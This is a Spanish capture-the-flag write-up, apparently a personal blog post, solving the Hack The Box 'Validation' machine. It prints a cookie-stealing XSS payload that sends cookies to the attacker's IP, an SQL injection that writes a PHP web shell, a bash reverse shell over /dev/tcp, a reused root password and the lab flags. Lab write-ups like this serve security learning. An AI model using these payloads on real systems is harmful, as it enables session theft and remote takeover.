@@ -1,0 +1,114 @@
+---
+title: 'CTF - Validation WriteUp'
+date: '2022-02-08'
+tags: ["CTF", "Hacking", "SQLInjection", "XSS", "#Import 2022-12-20 21:06"]
+draft: false
+authors: ['default']
+summary: Esta máquina es del creador de contenido de Ciberseguridad IppSec Podemos encontrar varias máquinas
+---
+
+Esta máquina es del creador de contenido de Ciberseguridad [IppSec](https://www.youtube.com/c/ippsec/videos). Podemos encontrar varias máquinas suyas en HTB y suelen ser todas bastante entretenidas.
+
+En este caso empezamos con el escaneo de puertos.
+
+
+```
+nmap -p- -sS --open -T5 -vvv -n -Pn -oG allPorts 10.10.11.116
+```
+NMAP all ports discoveryEn mi caso, el parámetro --min-rate 5000 no me funciona bien. Seguramente tenga algo que ver la máquina virtual que utilizo, por lo que utilizo -T5 que es el modo loco de NMAP para ir tan rápido como pueda.
+
+Descubrimos varios puertos abiertos.
+
+
+```
+❯ nmap -p22,80,4566,8080 -sCV -n -Pn 10.10.11.116 -oN targeted
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
+|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
+|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
+80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_http-server-header: Apache/2.4.48 (Debian)
+4566/tcp open  http    nginx
+|_http-title: 403 Forbidden
+8080/tcp open  http    nginx
+|_http-title: 502 Bad Gateway
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+El puerto 8080 devuelve un http status code 502 y el 4566 un 403 forbidden, por lo que nos centramos en el puerto 80.
+
+En la página principal aparece un formulario donde podemos introducir un nombre y elegir un país.
+
+![](https://blog.ikerocio.com/content/images/2022/02/form.png)Parece que al rellenarlo, nos lleva a otra página con la información registrada. Probamos una inyección XSS en el campo *Username* y avanzamos.
+
+
+```
+alert("XSS attack");
+```
+Pulsamos al botón de Join Now y encontramos lo siguiente.
+
+![](https://blog.ikerocio.com/content/images/2022/02/xss.png)Una vez que validamos que es vulnerable a ataques XSS, busco el siguiente código en el cheatsheet de [R0B1NL1N](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md).
+
+
+```
+var i=new Image;i.src="http://10.10.14.14:8080/?"+document.cookie;
+```
+Y tras poner en escucha en nuestro equipo un servidor en el puerto 8080, recibo la siguiente petición. Lo que se ve a continuación soy yo entrando a la página y enviándome mi cookie de sesión *user=020fba18d39d4e3bbda3fa8396dd4563*. De esta forma verifico que todo funciona correctamente.
+
+
+```
+❯ python -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+10.10.14.14 - - [08/Feb/2022 18:39:45] "GET /?user=020fba18d39d4e3bbda3fa8396dd4563 HTTP/1.1" 200 -
+```
+Llegados a este punto cualquier usuario que entre a esa página, nos estará enviando su cookie de sesión. Continúo buscando cosas mientras dejo el servidor corriendo aunque ya os adelanto que por ese camino, no voy a conseguir nada más.
+
+Retomando los pasos previos, intento ver si el formulario es vulnerable a injecciones SQL y veo que el input del país es vulnerable.
+
+Monto Burpsuite, activo el proxy en mi navegador y modifico los parámetros de la petición /POST de la siguiente manera.
+
+
+```
+username=anyuser&country='union select "php system($_REQUEST['cmd']); ?" INTO OUTFILE "/var/www/html/shell.php"-- -
+```
+Me pongo en escucha con Netcat en mi máquina en el puerto 443 y realizo una petición a la siguiente URL.
+
+
+```
+http://10.10.11.116/shell.php?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.14%2F443%200%3E%261%0A
+```
+La URL está codificada. El contenido de cmd es bash -i & /dev/tcp/10.10.14.14/443 0&1.
+
+Recibo la shell y lo primero que hago es ver la siguiente configuración en el directorio actual.
+
+
+```
+www-data@validation:/var/www/html$ cat config.php
+php
+  $servername = "127.0.0.1";
+  $username = "uhc";
+  $password = "uhc-9qual-global-pw";
+  $dbname = "registration";
+
+  $conn = new mysqli($servername, $username, $password, $dbname);
+?
+```
+Veo las credenciales de MySQL. Podría tratar de enumerar el contenido de la base de datos, pero pruebo por casualidad si soy capaz de ponerme como sudo con la misma contraseña.
+
+
+```
+www-data@validation: su -
+uhc-9qual-global-pw
+root@validation:~#
+```
+Llegados a este punto, tenemos acceso a todo el contenido. Enumero las flags y listo.
+
+
+```
+root@validation:~# cat /home/htb/user.txt
+e4be632da67c582f555571fdfa8135d6
+root@validation:~# cat root.txt
+459129eac316e8f9a522758f2a362493
+```
